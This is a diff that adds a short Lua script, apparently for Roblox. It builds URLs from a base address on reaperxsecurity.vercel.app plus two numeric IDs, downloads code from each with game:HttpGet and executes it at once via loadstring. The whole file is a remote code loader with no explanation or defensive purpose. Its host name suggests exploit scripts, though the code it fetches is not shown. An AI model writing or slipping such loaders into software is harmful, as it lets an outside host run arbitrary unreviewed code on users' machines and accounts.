@@ -1,0 +1,20 @@
+local BASE = "https://reaperxsecurity.vercel.app/"
+
+local ID = {
+    Waiting = 123,
+    Main = 456
+}
+
+local Order = {
+    "Waiting",
+    "Main"
+}
+
+local function RunScript()
+    for _, Name in ipairs(Order) do
+        local URL = BASE .. ID[Name]
+        loadstring(game:HttpGet(URL))()
+    end
+end
+
+RunScript()
